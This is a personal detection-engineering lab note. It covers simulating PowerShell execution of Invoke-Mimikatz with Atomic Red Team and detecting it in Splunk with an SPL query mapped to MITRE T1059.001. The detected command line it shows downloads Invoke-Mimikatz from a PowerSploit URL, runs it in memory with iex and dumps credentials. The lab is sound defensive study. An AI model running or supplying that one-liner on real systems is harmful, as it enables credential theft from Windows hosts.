tags: [detection, splunk, attack-range, mitre, T1059.001]
date: {{date}}
status: complete
---

# 🧪 Lab 1: PowerShell Execution – T1059.001

## ✅ Status
- [x] Simulate: `powershell.exe -EncodedCommand ...`
- [x] Write SPL to detect it (EventCode 4688 + CommandLine)
- [x] Save alert and document in vault

---

## 📜 Description
## 🔎 Introduction  
[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well-known post-exploitation tool used by attackers to dump credentials from Windows memory.  
Detecting its execution is critical for defending against credential theft and privilege escalation.  

In this lab, I use **Splunk Free**, **Sysmon**, and **Windows Security Logs** to build a detection for suspicious PowerShell execution of `Invoke-Mimikatz`.
Mapped to MITRE ATT&CK technique **T1059.001** – PowerShell under the Execution tactic.

---
## 🛠️ Detection Approach  

- **Environment:** Windows 10 host + Splunk Free  
- **Logging:** Sysmon & Security Event Logs  
- **Technique:** MITRE ATT&CK [T1059.001 – PowerShell](https://attack.mitre.org/techniques/T1059/001/)  
- **Goal:** Detect malicious PowerShell activity that downloads and executes `Invoke-Mimikatz`  

---

## 🛠 Simulation Steps

### Step 1 – Run Atomic T1059.001-1 Mimikatz

```
PS C:\AtomicREdTeam\atomics> Invoke-AtomicTest T1059.001 -TestNumbers 1

```



__

### Step 2 – Detect  Mimikatz in Splunk

## 📜 Splunk Query  

```spl
eval CommandLine=lower(CommandLine)
search CommandLine="*powershell*"
search CommandLine="*iex*"
table _time, host, user, parent_process_name, process_name, CommandLine
```

[[Mimikatz - Splunk Query.png]]


__

### Step 3– Write Detection/Connect to Discord Alerts

Splunk detected suspicious execution attempts:

- **Host:** `KA-AR-WINDOWS`
    
- **User:** `localuser`
    
- **Parent Process:** `cmd.exe`
    
- **Process:** `powershell.exe`
    
- **Command Line:**

```
powershell.exe "iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/powershellmafia/powersploit/.../invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds"
```

[[Mimikatz - Detection.png]]


__

Send alert to Discord Server using a script.

### Webhook to Discord -
[[Mimikatz - actualshown -detection.png]]
[[T1059.001.png]]




## Takeaways-
Cool first detection attempt. Can't wait to build more!
